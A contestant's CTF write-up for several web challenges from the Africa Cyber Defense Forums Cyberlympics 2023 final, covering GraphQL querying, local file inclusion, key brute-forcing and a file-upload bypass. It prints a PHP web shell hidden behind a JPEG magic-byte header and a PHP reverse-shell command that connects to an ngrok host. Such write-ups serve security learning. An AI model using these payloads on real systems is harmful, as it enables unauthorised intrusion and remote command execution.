<h1> Final Africa Cyber Defense Forums Cyberlympics CTF 2023 </h1>

Team: RedTeam-TG

Id: Assa

I'll give the solutions to some of the challenges that I solved but you can check the full writeups of the team here:
<br>
https://hackmd.io/@RedTeamTG/acdfctf-final-2023

#### Web
- Grandline
- Image Lookup
- Konoha
- DPO Agba
  
#### Cryptography
- What's going on 

#### Forensics
- Detective Conan 1 

#### Steganography
- Toka 
</details>

<br>
<details><summary>Web :</summary>
  
- Grandline:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/7.png" alt="img"></p>

This is an injection of graphql code, we even have a console which displays the results of the commands

First of all, we are going to do the enumeration in order to see the functions and methods that are accessible. the following payload does the trick:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/1.png" alt="img"></p>

we can notice that we have an interesting function called "flags" with the id, author, content and flag parameters.
Let's try to query the id 1 of the flags function. here I specified the content and flag parameters.

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/2.png" alt="img"></p>


We notice that we have a return with the following content: "Why don't you dig harder"; the rest becomes logical we must identify the id which contains our flag. I first tried id 2 then id 3 which turned out to be the right one.

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/3.png" alt="img"></p>

Flag: acdfCTF{L3t_try_s0m3_Graph_0ut}


- Image Lookup:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/6.png" alt="img"></p>

This one is an easy lfi web challenge you just had to call the flag file with the following payload: "file:///flag.txt" , paying attention to encoding the characters /
here is the query that I used to get the flag

```http://16.170.230.246/index.php?url=file%3a%2f%2f%2fflag.txt```

Unfortunately the flag is no longer accessible on the server


- Konoha:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/4.png" alt="img"></p>

we have a source.php file. let's try to analyze it:
```python
<?php
$secretFilePath = '/app/Sup3rs3cr3tFlag.txt';

$secretKey = 'Kismet-Abzee-Berrywuxxxxx';

$requestedFile = isset($_GET['file']) ? $_GET['file'] : '';

$providedKey = isset($_GET['key']) ? $_GET['key'] : '';

$decodedFile = urldecode($requestedFile);

if ($providedKey !== $secretKey) {
    header("HTTP/1.0 403 Forbidden");
    echo "Access denied!";
    exit;
}

if ($decodedFile === 'Sup3rs3cr3tFlag.txt') {
    $secretContent = file_get_contents($secretFilePath);
    echo $secretContent;
} else {
    header("HTTP/1.0 403 Forbidden");
    echo "Access denied!";
}
?>
```
after reading we see that the source.php script gives us the possibility of making GET type requests with the "file" and "key" parameters. key is then the secret code allowing access to the file and file must contain the name of the file. 
```
if ($decodedFile === 'Sup3rs3cr3tFlag.txt') {
     $secretContent = file_get_contents($secretFilePath);
     echo $secretContent;
}
```
the previous lines check that the file name corresponds to Sup3rs3cr3tFlag.txt and displays this secret message to us 
```echo $secretContent;```
what could be simpler we have the name of the file and the key to access it.
be careful in the key value we have hidden characters (5 characters x) 'Kismet-Abzee-Berrywuxxxxx'.
It is therefore necessary to brute force the missing x characters. the hint gave us part of the missing characters, we just had to brute force the rest to obtain the flag.
Ps: apparently the 5 missing characters x could be found in the source code of the application personally I didn't solve it like that.
here is the final request to have the flag:

```http://51.20.91.159/source.php?file=Sup3rs3cr3tFlag.txt&key=Kismet-Abzee-Berrywuzh3r3```

The flag has unfortunately been removed from the server. I unfortunately didn't take a picture when I solved it but the previous request still exact..

- DPO Agba:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/8.png" alt="img"></p>

the images from the web server are no longer accessible I'm going to do a writeup for you a little blindly lol, I would have liked to add more illustrations but hey it doesn't matter, let's go.

The first step was to decode the obfuscated data in the source code. Cyberchef made it possible:

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/9.png" alt="img"></p>

when we analyze the result we can see that we have a way to upload images to the server using the upload.php file. What better way to have a shell!.
Unfortunately when we tried to upload our image, we have restrictions that prevent us from uploading php files or anything other than images and in addition the file size must not exceed more than 35 bytes. Here we need to bypass these restrictions.

We can trick the filter into thinking the .php file I want to upload is actually a .jpeg file. But I had to modify our file's header like this.

our initial payload: ```<?php system($_GET['cmd']); ?>```

but to make that work we have to change the header to that of a .jpeg file. Checking it up online I found this “FF D8 FF EE”. So, let’s change the header to that; hexed.it does the trick.

<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/10.png" alt="img"></p>

our final image content should look like this: ```ÿØÿî<?php system($_GET['cmd']); ?>```

Now, that we have successfully changed the header we can upload our file "cmd.php"

after that I just launched a reverse shell on my computer using a TCP connection with an ngrock server. So I was able to have a shell. The next step was to look for the flag on the server. I spent a lot of time looking for the flag before finding it one of the files present on the server. 

Here the payload that I used to get the shell:<br>
```http://16.170.159.222/images/cmd.php?cmd=php+-r+'$sock%3dfsockopen("tcp://4.tcp.ngrok.io",16205)%3bexec("sh+<%263+>%263+2>%263")%3b'```
</details>
